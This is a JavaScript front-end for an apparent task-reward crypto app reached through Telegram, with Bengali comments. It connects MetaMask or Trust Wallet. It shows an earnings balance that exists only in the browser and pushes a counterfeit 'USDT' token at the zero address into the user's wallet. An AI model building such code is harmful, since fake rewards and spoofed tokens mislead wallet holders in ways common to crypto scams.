let balance = 0.00;

// Section Switcher
function switchPage(pageId, button) {
    document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
    
    document.getElementById(pageId).classList.add('active');
    button.classList.add('active');
    closeWalletModal();
}

// Global Task Reward Handler
function completeTask(reward, btn) {
    balance += reward;
    document.getElementById('user-balance').innerText = "$" + balance.toFixed(2);
    btn.innerText = "Completed";
    btn.disabled = true;
    btn.style.background = "#231e36";
    btn.style.boxShadow = "none";
    btn.style.color = "#6b7280";
}

// Modal Control
function openWalletModal() {
    document.getElementById('walletModal').style.display = 'flex';
}

function closeWalletModal() {
    document.getElementById('walletModal').style.display = 'none';
}

document.getElementById('walletModal').addEventListener('click', function(e) {
    if (e.target === this) closeWalletModal();
});

// পেজ লোড হওয়ার সাথে সাথে যদি ওয়ালেট ব্রাউজারে থাকে তবে অটো-কানেক্ট চেক করবে
window.addEventListener('load', () => {
    if (window.ethereum) {
        checkExistingConnection();
    }
});

async function checkExistingConnection() {
    try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
            handleWalletConnected(accounts[0]);
        }
    } catch (err) {
        console.error(err);
    }
}

function handleWalletConnected(walletAddress) {
    let walletFrame = document.getElementById('wallet').contentWindow;
    if(walletFrame && walletFrame.showWithdrawSection) {
        walletFrame.showWithdrawSection(walletAddress);
    }
}

/**
 * ওয়ালেট কানেক্ট এবং সরাসরি কনফার্মেশন পপ-আপ আনার মূল ফাংশন
 */
async function connectViaApp(walletType) {
    closeWalletModal();
    
    // ১. ইউজার যখন ওয়ালেট অ্যাপের ভেতরের ব্রাউজার দিয়ে সাইটে ঢুকবে (কনফার্মেশন পপ-আপ আসবে)
    if (window.ethereum) {
        try {
            // এটি সরাসরি ওয়ালেটের অফিশিয়াল "Connect" পপ-আপ স্ক্রিনে নিয়ে আসবে
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            handleWalletConnected(accounts[0]);

            // ব্যাকগ্রাউন্ডে কাস্টম টোকেন পারমিশন প্রম্পট পাঠানো
            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: '0x0000000000000000000000000000000000000000', 
                        symbol: 'USDT',
                        decimals: 18,
                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                    },
                },
            });
        } catch (error) {
            console.error("User rejected", error);
        }
    } 
    // ২. ইউজার যখন টেলিগ্রামের ভেতর প্রথমবার লোগোতে চাপ দেবে (কনফার্মেশন সেশন সহ রিডাইরেক্ট)
    else {
        // সেশন ধরে রাখার জন্য ডাইনামিক লিঙ্ক প্রিপারেশন
        let currentUrl = window.location.href;
        
        if (walletType === 'trust') {
            // ট্রাস্ট ওয়ালেটের অফিশিয়াল ইন-অ্যাপ ব্রাউজার ওপেনার প্রোটোকল যা সরাসরি কানেক্ট ট্রিগার করে
            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(currentUrl);
        } else if (walletType === 'metamask') {
            let cleanUrl = currentUrl.replace('https://', '');
            window.location.href = "https://metamask.app.link/dapp/" + cleanUrl;
        } else {
            alert("Please use Trust Wallet or MetaMask DApp Browser.");
        }
    }
}
